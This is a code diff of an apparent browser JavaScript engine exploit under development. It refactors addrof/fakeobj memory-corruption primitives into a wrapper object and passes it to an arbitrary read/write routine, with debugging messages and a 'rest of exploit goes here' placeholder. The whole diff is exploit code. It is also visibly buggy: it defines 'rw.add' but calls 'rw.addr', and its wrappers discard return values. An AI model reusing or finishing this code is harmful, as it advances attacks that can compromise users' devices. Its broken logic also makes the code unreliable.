@@ -516,17 +516,25 @@ var VM_PROT_EXECUTE = 0x4
               b1[0] = val;
               return float2bigint(a1[0]);
             }
+            var rw = {
+                fake: function(addr) {
+                    fakeobj(addr)
+                },
+                add: function(obj) {
+                    addrof(obj)
+                },
+            }
               /*fakeobj = (addr) => {
                   fakeArr
               }*/
              //let me try my own fakeobj method.
             
             port.postMessage("We got stableish addrof and fakeobj");
-            
+            return rw;
           }
           
 
-          function arbrw() {
+          function arbrw(rw) {
               var print = (msg) => {
                   port.postMessage(msg)
               };
@@ -596,8 +604,8 @@ var VM_PROT_EXECUTE = 0x4
     var origButterfly = hax[1];
 
     var memory = {
-        addrof: addrof,
-        fakeobj: fakeobj,
+        addrof: rw.addr,
+        fakeobj: rw.fake,
 
         // Write an int64 to the given address.
         writeInt64: function(addr, int64) {
@@ -791,13 +799,13 @@ var VM_PROT_EXECUTE = 0x4
         }
           function pwn() {
             try {
-              setupPrimitives();
+              var set = setupPrimitives();
 
               // ensure we can survive GC
               gc();
 
               // TODO: rest of exploit goes here
-              arbrw();
+              arbrw(set);
               port.postMessage("done!");
             } catch(e) { // send exception strings to main thread (for debugging)
               port.postMessage("Exception!!");
